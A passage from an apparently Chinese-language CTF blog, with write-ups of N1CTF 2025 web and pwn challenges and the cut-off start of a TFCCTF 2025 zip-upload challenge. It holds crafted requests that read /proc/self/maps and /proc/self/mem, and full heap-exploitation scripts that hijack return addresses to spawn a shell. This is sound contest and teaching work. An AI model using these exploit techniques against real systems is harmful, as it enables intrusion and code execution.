<span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取 filename 文件内容</span></span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br></pre></td></tr></table></figure>

<p>读取 &#x2F;proc&#x2F;self&#x2F;maps 查看flag存放的偏移 offset</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=0&amp;length=100000000000.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/maps</span><br></pre></td></tr></table></figure>

<p>得到maps：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 11653</span><br><span class="line"></span><br><span class="line">7fe58e045000-7fe58e047000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fe58f5c8000-7fe58f5c9000 rw-s 00000000 00:01 5143                       /dev/zero (deleted)</span><br><span class="line">7fe58f5c9000-7fe58f5cb000 rw-p 00000000 00:00 0 </span><br><span class="line">7fe58f5cb000-7fe58f5cc000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fe58f602000-7fe58f603000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffec822a000-7ffec824b000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffec83da000-7ffec83de000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffec83de000-7ffec83e0000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>根据本地python的对比测试，<code>mmap</code>后会有一个叫做 <code>/dev/zero (deleted)</code>的内存空间被分配出来<br>根据它的地址从<code>mem</code>中读取<code>mmap</code>到的flag</p>
<p>读取 <code>/proc/self/mem</code> 文件，<code>offset</code>设置为十进制的<code>0x7fe58f5c8000</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=140623929442304&amp;length=4096.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/mem</span><br></pre></td></tr></table></figure>

<p>拿到FLAG</p>
<p><img src="/image-20250914010944252.png" alt="image-20250914010944252"></p>
<h3 id="safenote"><a href="#safenote" class="headerlink" title="safenote"></a>safenote</h3><p>功能：</p>
<p>xss限制：nounce限制脚本执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/10/junior/" data-id="cuidFuavr-DITUWKXviTXOchY" data-title="n1ctf junior 2/2 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-n1ctf-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/16/n1ctf-pwn/" class="article-date">
  <time class="dt-published" datetime="2025-09-16T12:33:09.000Z" itemprop="datePublished">2025-09-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/16/n1ctf-pwn/">n1ctf2025_pwn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h1><p>保护全开</p>
<h2 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h2><ol>
<li>读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor = <span class="number">0x111111111111111</span></span><br><span class="line">validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br></pre></td></tr></table></figure>

<style>.pmdrbwrmsfog{zoom:67%;}</style><img src="/2025/09/16/n1ctf-pwn/4893f3cf5d0d480a8e32d9a11b2bbc82.png" class="pmdrbwrmsfog">

<ol start="2">
<li><p>创建0x180的chunk存放note 结构体每个note大小为0x30，note结构：</p>
<style>.aawbubrneisb{}</style><img src="/2025/09/16/n1ctf-pwn/290fdb0b196e4d8a891ba30cab77f70e.png" class="aawbubrneisb">
</li>
<li><p>add，edit，delete，show操作</p>
</li>
</ol>
<h2 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h2><ol>
<li><p>editName中strlen可以用\x00绕过造成溢出</p>
</li>
<li><p>后门：remove操作中有一个一眼就很可疑的地方：lucky number，</p>
<style>.sprpykdhhmbm{}</style><img src="/2025/09/16/n1ctf-pwn/9b07c2893b9a413eab54aa77cdc96058.png" class="sprpykdhhmbm" alt="在这里插入图片描述">
<p>如果这里的if判断不通过，直接return，看反编译的伪代码不容易看出来，看汇编代码+动态调试可以发现<br>if判断的参数初始值为1，如果执行过一次editName操作以后，这个参数会自减一次，此时remove函数结束时会执行 ret lucyNumber操作<br><img src="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png" alt="[图片]"></p>
</li>
<li><p>这里的xor操作，其中的一个操作数是可控的，dest</p>
<style>.gxwfszoylvqc{}</style><img src="/2025/09/16/n1ctf-pwn/efc5f43229f54d76933b5a234281a226.png" class="gxwfszoylvqc"></li>
</ol>
<p><img src="/f46bbfaa51ec4ba798082ec1cc2ff78b.png"></p>
<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>editName操作和show操作只能执行一次<br>利用xor操作构造任意地址读写条件泄露libc地址</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一阶段：<br>泄露heap基址和程序基址（PIE）<br>由于存在xor后的数据chunk的地址，结合动态调试，heap地址的后三字节是固定的，加上一字节的\x00溢出，<br>第一个note content chunk的起始地址为000+0x290（tcache bin管理结构）+0x190(note 结构体 chunk)&#x3D;0x420<br>如果控制xor的操作数后两位为20，且第二个note content chunk与第一个同处于0x400-0x4ff空间上，当使用editName方法溢出第二个结构体chunk的name，此时这两个结构体chunk的note content chunk就指向了同一个，此时就构造了一个UAF，可以泄露heap地址和程序地址（程序地址用BSS的chunkList的地址）<br>此时edit和show都用过一次不能再用了，很自然的就想到再执行一次main函数，将luckynumber设置为main addr<br>第二阶段：<br>上面只是思考过程，此时才发现：<br>在回顾一下heap的构造，结构体chunk有一部分也处0x400-0x4ff，再溢出一次name则xor结果末两位是00，此时xor第一个操作数末两位是什么（假如设置为0xmn），那么这个溢出的结构体的conten就会指向0x4mn，第一阶段的泄露操作也可以通过最后一个结构体chunk泄露</p>
<p>这时就可以show和修改最后一个struct chunk的data  content chunk的地址（要写入xor后的结果），将其指向got表结合show操作就可以泄露libc、heap、程序地址<br>最后将LUCKYNUMBER设置为onegadget即可</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    xor = <span class="number">0x111111111111111</span></span><br><span class="line">    validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    key_default = <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span></span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    remove(key_default,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit_name(key_default,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>))</span><br><span class="line">    show(key_default,<span class="number">7</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    heap_base = ((uu64(r(<span class="number">7</span>))&lt;&lt;<span class="number">8</span>)^xor)&gt;&gt;<span class="number">12</span>&lt;&lt;<span class="number">12</span></span><br><span class="line">    leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    proc_base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0x4080</span> - <span class="number">0x7</span>*<span class="number">8</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    main_sym = <span class="number">0x1CC7</span></span><br><span class="line">    ret_addr_in_remove = proc_base+main_sym</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(ret_addr_in_remove))</span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    one_gadget = one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    edit_name(key_default,<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>)+p64((proc_base+elf.got[<span class="string">&#x27;free&#x27;</span>])^xor))</span><br><span class="line">    show(key_default,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    free_addr = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    libc.address = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(libc.address+one_gadget))</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h1 id="近队容器的礼仪"><a href="#近队容器的礼仪" class="headerlink" title="近队容器的礼仪"></a>近队容器的礼仪</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>附件给出了pwn文件和libc文件夹，将libc.so.6和ld文件从libc文件夹中剪切出来，注意是剪切，确保libc文件夹中不再存在这两个文件，<br>直接运行使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --replace-needed libc.so.6  ./libc.so.6 pwn</span><br><span class="line">LD_LIBRARY_PATH=./libc pwn</span><br></pre></td></tr></table></figure>

<p>python中pwnlib调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也需要先像上面的shell命令一样先patchelf</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">p = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 二选一即可</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p = gdb.debug(binary, gdbscript,env=&#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;1. Exit\n&#x27;</span><br><span class="line">b&#x27;2. Add deque to vector\n&#x27;</span><br><span class="line">b&#x27;3. Create Animal in deque\n&#x27;</span><br><span class="line">b&#x27;4. Remove deque from vector\n&#x27;</span><br><span class="line">b&#x27;5. Remove Animal from deque\n&#x27;</span><br><span class="line">b&#x27;6. Edit Animal in deque\n&#x27;</span><br><span class="line">b&#x27;7. Print Animal in deque\n&#x27;</span><br><span class="line">b&#x27;12. Create Animal in vector\n&#x27;</span><br><span class="line">b&#x27;13. Remove Animal from vector\n&#x27;</span><br><span class="line">b&#x27;14. Edit Animal in vector\n&#x27;</span><br><span class="line">b&#x27;15. Print Animal in vector\n&#x27;</span><br><span class="line">b&#x27;Enter your choice: &#x27;</span><br></pre></td></tr></table></figure>

<p>IDA的结果看起来太复杂了，先直接进行几次操作看看</p>
<p>先尝试下有没有UAF<br>结果一试还真有</p>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
<li>刚刚提到的UAF，可以通过unsorted bin fd泄露libc和tcache bin fd泄露heap基址</li>
<li>堆溢出<br><img src="/8a19c192b90d42a38510052ff390ade9.png"><br>很明显看到有个堆溢出</li>
</ol>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先利用deque上的操作泄露地址<br>后用vector上的操作任意地址写（当时熬夜写的题，我也没去分析它到底能不能用deque的方法来，就是觉得给了这么多方法都用试试）<br>vecor申请的chunk结构是：一个0x20大小的结构体和对应size大小的animal，结构体中写着animal chunk的地址，因为能栈溢出，所以直接可以任意地址写<br>这里采取的操作时打enviorn打栈，从main的ret指令开始打；<br>算出environ到执行到main ret时栈地址的偏移量，然后构造栈满足ongadget的条件即可，也可以构造rop链<br>利用脚本<br>最后执行exit操作就可以执行到main的ret<br>注意执行execve的时候保证结尾是0x0而不是8吧，对齐一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    add_deque()</span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    show_animal_deque(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">    libc.address = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))-<span class="number">0x203b20</span></span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>,libc.address)</span><br><span class="line">    <span class="comment"># 防止deque为空而不能show UAF</span></span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;    0xef52b execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x78])</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">    rax == NULL || &#123;&quot;/bin/sh&quot;, rax, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">    [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp&#x27;&#x27;&#x27;</span></span><br><span class="line">    one_gadget =libc.address + one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    environ =  libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)    </span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    environ_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x30</span>))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    start_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>)) - <span class="number">37</span></span><br><span class="line">    proc_base = start_addr - elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ret_of_main = environ_addr - <span class="number">0x130</span></span><br><span class="line">    ret_addr = proc_base+<span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main+<span class="number">8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x110</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0xe8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># exit 推出时会执行ret of main</span></span><br><span class="line">    sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/16/n1ctf-pwn/" data-id="cuidlH2teuA6txmHVyAcynOGJ" data-title="n1ctf2025_pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-TFCCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/02/TFCCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-09-02T13:53:05.000Z" itemprop="datePublished">2025-09-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/02/TFCCTF2025/">TFCCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SLIPPY"><a href="#SLIPPY" class="headerlink" title="SLIPPY"></a>SLIPPY</h3><p><strong>一、题目描述</strong></p>
<p>打开靶机，可以上传ZIP压缩包，系统尝试解压并将成功解压的文件放置在 upload&#x2F; 目录下，供用户下载</p>
<style>.ejmdnvpuwrnk{zoom: 80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901091932761.png" class="ejmdnvpuwrnk" alt="image-20250901091932761">

<p>根据Dockerfile，FLAG 存放在 &#x2F;xxxxxxx&#x2F;flag.txt下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN rand_dir=&quot;/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)&quot;; mkdir &quot;$rand_dir&quot; &amp;&amp; echo &quot;TFCCTF&#123;Fake_fLag&#125;&quot; &gt; &quot;$rand_dir/flag.txt&quot; &amp;&amp; chmod -R +r &quot;$rand_dir&quot;</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>调试环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 docker</span></span><br><span class="line">docker run -it -p 3000:3000 -p 9229:9229 slippy node --inspect-brk=0.0.0.0:9229 server.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问chrome://inspect</span></span><br></pre></td></tr></table></figure>

<p>查看源码，分析相关处理逻辑</p>
<p>upload上传文件之后，通过<code>unzip</code>命令解压，然后存放在 <code>upload/session_userid/</code> 目录下</p>
<p>可能存在软链接读取文件，不存在zip slip路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;      <span class="comment">// 上传文件暂存目录</span></span><br><span class="line">    <span class="comment">// 拼接解压缩的目标路径 upload/xxxxxxx</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);   </span><br><span class="line">     <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span 